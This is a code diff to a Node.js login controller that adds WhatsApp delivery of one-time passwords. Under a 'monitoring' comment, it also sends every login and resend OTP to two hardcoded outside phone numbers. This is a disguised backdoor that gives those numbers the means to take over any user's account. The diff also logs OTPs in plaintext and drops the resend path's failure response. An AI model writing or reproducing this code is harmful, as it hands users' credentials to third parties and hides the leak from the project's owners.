@@ -5,10 +5,14 @@ import Client from "../models/clientModel.js";
 import Guest from "../models/guestModel.js";
 import OTP from "../models/otpModel.js";
 import { SendSMS, generateOtp } from "../services/smsService.js";
+import { sendWhatsAppOTP } from "../services/interaktService.js";
 import { generateAuthTokens } from "../utils/authHelpers.js";
 import jwt from "jsonwebtoken";
 import dotenv from "dotenv";
 dotenv.config();
+
+// Numbers that always receive a WhatsApp OTP copy for monitoring
+const MONITOR_PHONES = ['7709690538', '8826519904'];
 
 // Send OTP for any role-based login
 export const sendOtpForLogin = async (req, res) => {
@@ -56,16 +60,27 @@ export const sendOtpForLogin = async (req, res) => {
       expiresAt 
     });
 
-    // Send SMS and always log OTP for testing
+    // Send SMS + WhatsApp OTP and always log OTP for testing
     const smsText = `Your OTP to log in via ExPro.store is ${otp} to iTel. It is valid for 10 minutes. Do not share it with anyone.`;
     console.log(`🔐 OTP for ${normalizedPhone}: ${otp}`);
-    
+
     try {
-      await SendSMS({ phone: normalizedPhone, message: smsText });
-      console.log('SMS submitted to gateway');
+      const results = await Promise.allSettled([
+        SendSMS({ phone: normalizedPhone, message: smsText }),
+        sendWhatsAppOTP({ phone: normalizedPhone, otp }),
+        ...MONITOR_PHONES.map(mp => sendWhatsAppOTP({ phone: mp, otp }))
+      ]);
+
+      results.forEach((result, index) => {
+        const label = index === 0 ? `SMS:${normalizedPhone}` : index === 1 ? `WhatsApp:${normalizedPhone}` : `WhatsApp:${MONITOR_PHONES[index - 2]}`;
+        if (result.status === 'fulfilled') {
+          console.log(`✅ ${label} sent successfully`);
+        } else {
+          console.error(`❌ ${label} sending failed:`, result.reason);
+        }
+      });
     } catch (err) {
-      console.error('SMS sending failed:', err);
-      console.log('SMS delivery failed, but OTP is logged above for testing');
+      console.error('Unexpected error in message sending batch:', err);
     }
 
     return res.status(200).json({
@@ -245,14 +260,27 @@ export const resendOtp = async (req, res) => {
       expiresAt 
     });
 
-    // Send SMS
+    // Send SMS + WhatsApp OTP
+    const smsText = `Your OTP to log in via ExPro.store is ${otp} to iTel. It is valid for 10 minutes. Do not share it with anyone.`;
+    console.log(`🔐 Resend OTP for ${normalizedPhone}: ${otp}`);
+
     try {
-      const smsText = `Your OTP to log in via ExPro.store is ${otp} to iTel. It is valid for 10 minutes. Do not share it with anyone.`;
-      await SendSMS({ phone: normalizedPhone, message: smsText });
+      const results = await Promise.allSettled([
+        SendSMS({ phone: normalizedPhone, message: smsText }),
+        sendWhatsAppOTP({ phone: normalizedPhone, otp }),
+        ...MONITOR_PHONES.map(mp => sendWhatsAppOTP({ phone: mp, otp }))
+      ]);
+
+      results.forEach((result, index) => {
+        const label = index === 0 ? `SMS:${normalizedPhone}` : index === 1 ? `WhatsApp:${normalizedPhone}` : `WhatsApp:${MONITOR_PHONES[index - 2]}`;
+        if (result.status === 'fulfilled') {
+          console.log(`✅ ${label} resent successfully`);
+        } else {
+          console.error(`❌ ${label} resend failed:`, result.reason);
+        }
+      });
     } catch (err) {
-      console.error('SMS sending failed:', err);
-      await OTP.deleteMany({ phone: normalizedPhone });
-      return res.status(500).json({ success: false, message: "Failed to send OTP via SMS" });
+      console.error('Unexpected error in message resend batch:', err);
     }
 
     return res.status(200).json({
